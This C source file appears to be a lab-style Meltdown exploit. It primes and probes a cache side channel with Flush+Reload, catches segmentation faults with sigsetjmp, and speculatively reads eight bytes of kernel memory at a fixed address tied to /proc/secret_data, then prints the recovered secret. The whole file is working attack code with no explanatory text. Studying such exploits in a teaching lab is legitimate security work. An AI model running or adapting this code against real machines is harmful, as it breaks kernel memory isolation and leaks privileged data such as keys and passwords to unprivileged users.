#include <emmintrin.h>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>

/*********************** Flush + Reload ************************/
uint8_t array[256 * 4096];
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel() {
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i * 4096 + DELTA] = 1;

  // flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i * 4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved() {
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      scores[i]++; /* if cache hit, add 1 for this value */
  }
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr) {
  char kernel_data = 0;

  // Give eax register something to do
  asm volatile(
      ".rept 4000;"
      "add $0x141, %%eax;"
      ".endr;"

      :
      :
      : "eax");

  // The following statement will cause an exception
  kernel_data = *(char *)kernel_data_addr;
  array[kernel_data * 4096 + DELTA] += 1;
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

int main2(int argc, char **argv) {
  int i, j, ret = 0;

  // Register signal handler
  signal(SIGSEGV, catch_segv);

  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }

  int offset = argc > 1 ? (argv[1][0] - '0') : 0;
  // printf("target offset = %d\n", offset);

  memset(scores, 0, sizeof(scores));
  flushSideChannel();

  // Retry 1000 times on the same address.
  for (i = 0; i < 1000; i++) {
    ret = pread(fd, NULL, 0, 0);
    if (ret < 0) {
      perror("pread");
      break;
    }

    // Flush the probing array
    for (j = 0; j < 256; j++) _mm_clflush(&array[j * 4096 + DELTA]);

    if (sigsetjmp(jbuf, 1) == 0) {
      meltdown_asm(0xfa05e000 + offset);
    }

    reloadSideChannelImproved();
  }

  // Find the index with the highest score.
  int max = 0;
  for (i = 0; i < 256; i++) {
    if (scores[max] < scores[i]) max = i;
  }

  // printf("The secret value is %d %c\n", max, max);
  // printf("The number of hits is %d\n", scores[max]);

  return max;
}

int main() {
  char res[9] = {0};
  for (int i = 0; i < 8; i++) {
    char c = '0' + i;
    char *s[2] = {"", &c};
    res[i] = (char) main2(2, s);
  }
  res[8] = '\0';
  puts(res);
  return 0;
}
